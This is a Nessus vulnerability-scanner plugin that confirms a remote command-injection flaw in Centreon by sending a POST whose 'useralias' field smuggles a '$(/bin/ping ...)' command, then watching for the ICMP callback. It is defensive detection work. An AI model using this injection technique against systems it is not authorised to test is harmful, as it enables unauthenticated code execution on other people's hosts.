#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(80358);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/05/08 18:22:10 $");

  script_bugtraq_id(71333);

  script_name(english:"Centreon 'insertLog()' Function RCE");
  script_summary(english:"Attempts to exploit a RCE flaw.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Centreon application hosted on the remote web server is affected
by a remote code execution vulnerability due to a failure to properly
sanitize user-supplied input before using it in a SQL query. The
application uses the 'echo' system command with the PHP exec()
function which allows a remote, unauthenticated attacker to craft a
request and execute arbitrary system commands on the remote host.

Note that the application is also reportedly affected by a local
information disclosure vulnerability, however Nessus has not tested
for this issue.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2014/q4/848");
  script_set_attribute(attribute:"see_also", value:"https://github.com/centreon/");
  script_set_attribute(attribute:"solution", value:"Upgrade to Centreon 2.5.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/11/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/11/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/01/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:centreon:centreon");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:merethis:centreon");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2017 Tenable Network Security, Inc.");

  script_dependencies("centreon_detect.nbin");
  script_require_keys("www/PHP", "installed_sw/Centreon");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Centreon";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

ptrn = hexstr(rand_str(length:10));
scan_ip = this_host();
target_ip = get_host_ip();

attack = "$(/bin/ping -p " +ptrn+ " -c 3 " +scan_ip+ ')\\';
postdata = 'useralias=' + attack + '&password=' + rand_str();

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

ua = get_kb_item("global_settings/http_user_agent");
if (empty_or_null(ua)) ua = 'Nessus';

# Form our POST req to send over the opened socket
attack =
'POST ' + dir + '/index.php HTTP/1.1\n' +
'Host: ' + target_ip + '\n' +
'Accept-Language: en\n' +
'Content-Type: application/x-www-form-urlencoded\n' +
'Connection: Keep-Alive\n' +
'Content-Length: ' + strlen(postdata) + '\n' +
'User-Agent: ' + ua + '\n'+
'\n' + postdata;

filter = "icmp and icmp[0] = 8 and src host " + target_ip;
s = send_capture(socket:soc,data:attack,pcap_filter:filter);
s = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
close(soc);

if (ptrn >< s)
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to exploit the issue using the following request :' +
      '\n' +
      '\n' + attack +
      '\n';
    snip = crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30);
    report +=
      '\nNessus confirmed this by examining ICMP traffic and looking for the' +
      '\npattern sent in our packet (' + ptrn + ').  Below is the response :' +
      '\n\n' + snip +
      '\n' + s +
      '\n' + snip +
      '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
